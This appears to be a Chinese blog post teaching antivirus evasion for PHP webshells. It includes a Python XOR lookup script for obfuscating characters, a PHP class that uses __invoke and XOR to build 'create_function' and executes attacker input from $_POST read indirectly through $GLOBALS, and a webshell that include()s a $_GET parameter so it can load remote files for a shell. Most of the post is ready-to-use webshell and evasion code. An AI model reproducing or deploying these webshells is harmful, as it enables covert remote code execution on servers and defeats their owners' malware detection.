昨天有写了异或，但是脚本弄得不是很好，有学过py的可能会看出我原本的意图。我忘记把完整代码贴进去了，现在我贴完整，相当于一个查询表，找对应的数值就可以得到相关的异或过程。

```
import string

a = string.printable
for i in range(len(a)):
    for j in range(len(a)):
        print(f'{a\[i\]}->{ord(a\[i\])} ^ {a\[j\]}->{ord(a\[j\])} = {ord(a\[i\])^ord(a\[j\])} ==> {chr(ord(a\[i\])^ord(a\[j\]))}')
```

##### 魔术方法\_\_invoke制作回调函数

具体参考：https://www.php.net/manual/zh/language.oop5.magic.php

现在造的轮子都有点像是对函数做重命名，只不过是通过不同的调用方式实现同一个函数的功能而已，但是效果很明显有效。

```
\_\_invoke( ...$values): mixed

// 当尝试以调用函数的方式调用一个对象时，\_\_invoke() 方法会被自动调用。
```

```
<?php 
class callback{
public function \_\_invoke()
{
$\_ \= chr(48 ^ 111); // 这两个异或结果是 \_
            // 对create\_function做免杀
return "create".$\_."function";
}
}
$param \= "";
// 规避$\_POST报毒
foreach ($GLOBALS as $key \=> $value) {
if($key \== '\_POST'){
$param \= $$key;
$param \= $param\['x'\];
}
}
$b \= new callback;
$c \=$b();
$d \= $c("", $param);
$d();
?>
```

##### 远程文件包含GetShell

比较简单，都是讲过的东西，只要把webshell写入txt文件，远程包含一下就可以getshell。因为包含的时候php会把txt里的内容当作代码解析。我这里偷个懒用之前的免杀webshell。

```
<?php 
$param \= "";
foreach ($GLOBALS as $key \=> $value) {
if($key \== '\_GET'){
$param \= $$key;
$param \= $param\['x'\];
}
}
include($param);
?>
```
